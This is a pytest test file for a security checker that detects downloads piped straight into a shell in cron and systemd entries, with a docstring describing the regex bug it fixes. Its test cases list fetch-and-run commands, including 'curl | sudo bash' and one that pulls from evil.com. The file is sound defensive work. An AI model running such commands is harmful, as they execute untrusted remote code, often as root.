"""
v0.15.0 — "curl | sudo bash" was not detected, and "curl | ssh host" was.

The rule "a download piped straight into a shell" existed twice, as two regexes
that disagreed with each other and with reality.

    cron_audit:      \\b(curl|wget)\\b.*\\|\\s*\\S*sh\\b
    systemd_timers:  \\|\\s*(/[a-z/]*/)?(?:ba)?sh\\b

The first matched any token ending in "sh", so `curl … | ssh backup@host` — an
ordinary pipe to a remote machine — was reported as a supply-chain risk. It also
required the token immediately after the pipe to be the shell, so
`curl … | sudo bash` was missed: the most published form of the one-liner, and
the dangerous one, because it runs as root.

The second knew only `sh` and `bash`, so `| zsh` went unnoticed in timers while
cron_audit caught it. One rule, two implementations, two different blind spots —
the third time this shape appeared in this cycle.

`pipes_into_shell` now lives in `bob/checks/_run.py` and matches on the command
word of each piped stage rather than on a suffix.
"""

from __future__ import annotations

import pytest

from bob.checks._run import pipes_into_shell


class TestTheDangerousForms:
    @pytest.mark.parametrize("cmd", [
        "curl http://x/i.sh | sh",
        "curl http://x/i.sh | bash",
        "wget -qO- http://x | sh",
        "curl http://x |sh",
        "curl http://x | /bin/sh",
        "curl http://x | sh -s --",
        "curl http://x | zsh",
        "CURL http://x | SH",
        "curl $URL | sh",
    ])
    def test_the_plain_forms_still_match(self, cmd):
        assert pipes_into_shell(cmd)

    @pytest.mark.parametrize("cmd", [
        "curl -sSL http://x | sudo bash",
        "curl -sSL http://x | sudo -E bash",
        "wget -O - http://x | sudo sh",
        "curl http://x | doas sh",
        "curl http://x | env bash",
        "curl http://x | nohup sh",
        "curl http://x | timeout 60 bash",
    ])
    def test_a_wrapper_no_longer_hides_the_shell(self, cmd):
        """These run the shell as much as the plain form does — `sudo bash`
        more so, since it runs it as root."""
        assert pipes_into_shell(cmd)

    def test_a_shell_at_a_later_stage_is_found(self):
        assert pipes_into_shell("curl http://x | tee /tmp/a | sh")

    @pytest.mark.parametrize("cmd", [
        '/bin/bash -c "curl http://evil.com | bash"',
        "/bin/sh -c 'curl http://x | sh'",
    ])
    def test_a_quoted_command_line_is_read(self, cmd):
        """How a systemd unit actually writes it — the closing quote sits on
        the last token."""
        assert pipes_into_shell(cmd)


class TestTheInnocentForms:
    def test_a_pipe_to_a_remote_host_is_not_a_shell_pipe(self):
        """"ssh" ends in "sh". The suffix match flagged this as a supply-chain
        risk; it is a backup command."""
        assert not pipes_into_shell("curl http://x | ssh backup@host 'cat > f'")

    @pytest.mark.parametrize("cmd", [
        "curl http://x | grep foo",
        "curl http://x | jq .",
        "curl http://x | gzip",
        "curl http://x | tar xz",
        "curl http://x -o /tmp/a.json",
        "wget -q http://x/f.tar.gz",
        "curl http://x > file",
    ])
    def test_ordinary_downloads_are_not_flagged(self, cmd):
        assert not pipes_into_shell(cmd)

    @pytest.mark.parametrize("cmd", [
        "cat file | bash",
        "echo hello | mail -s test root",
        "/usr/local/bin/backup.sh",
        "rsync -av /src /dst",
    ])
    def test_a_shell_without_a_download_is_not_this_pattern(self, cmd):
        assert not pipes_into_shell(cmd)

    def test_the_download_must_precede_the_pipe(self):
        assert not pipes_into_shell("cat /etc/hosts | sh && curl http://x")


class TestBothCallersUseTheSameRule:
    """The point of moving it: the two checks can no longer drift apart."""

    def test_cron_audit_imports_the_shared_helper(self):
        import bob.checks.cron_audit as m
        assert m.pipes_into_shell is pipes_into_shell

    def test_systemd_timers_imports_the_shared_helper(self):
        import bob.checks.systemd_timers as m
        assert m.pipes_into_shell is pipes_into_shell
